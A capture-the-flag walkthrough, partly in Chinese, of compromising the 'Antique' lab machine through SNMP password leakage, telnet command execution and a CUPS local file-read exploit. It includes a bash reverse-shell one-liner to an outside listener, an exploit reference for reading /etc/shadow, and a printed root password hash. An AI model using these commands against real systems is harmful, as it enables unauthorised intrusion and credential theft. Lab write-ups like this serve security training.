1, enumerate the ports (nmap)
23/tcp telnet

2, check telnet service 
	`telnet 10.10.11.107`
not surprised: it needs auths
but it give us some messages:
	`HP JetDirect`
HP JetDirect 是惠普公司开发的一系列网络打印服务器和网络接口卡，用于将打印机直接连接到计算机网络中。这使得多台计算机可以通过网络共享打印机资源。JetDirect 设备支持多种网络协议，并且可以通过浏览器进行配置和管理

let's check some cve about it.

"HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure"
https://www.exploit-db.com/exploits/22319

Given the last of any other paths on TCP, I’ll check back to a UDP scan. Scanning for UDP can be both slow and unreliable. I do find -sV to make the results more reliable (and probably slower), but even just looking a the top ten ports finds something interesting on Antique:
考虑到 TCP 上的最后一个其他路径，我将检查 UDP 扫描。扫描 UDP 可能既缓慢又不可靠。我确实发现 -sV 可以使结果更可靠（并且可能更慢），但即使只是查看前十个端口，也会在 Antique 上发现一些有趣的东西：

![](images/Pasted%20image%2020240723104024.png)
There we can see snmp open !
Let's exploit it.

Running snmpwalk on Antique will only return one entry:
	`snmpwalk -v 2c -c public 10.10.11.107`

these are hex representations of each byte. I’ll recognize that the numbers at the start of the list are in the hex ASCII range (0x20 - 0x7e), even if that ones at the end don’t make sense in that context.
![](images/Pasted%20image%2020240723104420.png)

try to use python to convert it to ASCII code.

	` nums = "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135"`
	`nums.split()`
	
I’ll use a Python list comprehension to loop over each item and apply the int function, converting each to a number, using base 16 to convert from hex
	`[int(x, 16) for x in nums.split()]`

Now I’ll want each converted to an ASCII character using chr:
	`[chr(int(x, 16)) for x in nums.split()]`
	`''.join([chr(int(x, 16)) for x in nums.split()])`

Finally, we get a maybe liked password:
"P@ssw0rd@123!!123"

And we successfully login !

3, get shell as user
when we press '?'
it would tell us we have get the ability to exec.(good news)

But when we want to make the reverse shell, it did not work.
So we have to find some trick skills to exec it.
Firstly we need check its terminal :
	`exec which bash`
Then we can try :
	`exec bash -c 'bash -i >& /dev/tcp/10.10.16.12/4444 0>&1'`
then shell got it.

4, Privilege Escalation
By using pspy64, we have known telnet.py is powerd by root
So it would be a interesting exploition of root

And we can check other ports.
	`netstat -tnlp`
tcp  127.0.0.1:631 
it is attactive for me, so let's curl it and check it.
	`<TITLE>Home - CUPS 1.6.1</TITLE>`
Let's search about it.

cups-root-file-read.sh | CVE-2012-5519
https://github.com/p1ckzi/CVE-2012-5519.git

we can use it get /etc/shadow or just directly to /root/root.txt
`root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::`


